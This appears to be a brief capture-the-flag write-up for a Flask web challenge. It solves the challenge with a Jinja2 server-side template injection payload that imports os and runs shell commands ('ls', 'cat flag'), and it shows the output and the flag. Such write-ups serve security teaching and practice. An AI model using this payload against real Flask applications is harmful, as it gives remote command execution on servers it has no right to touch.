# Parrot the emu - Web

## Description
It is so nice to hear Parrot the Emu talk back

Author: richighimi

https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev

## Solution

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

FLAG: `DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`

## Notes

Flask `render_template_string()`

SSTI 

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

app.py flag requirements.txt static templates 

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}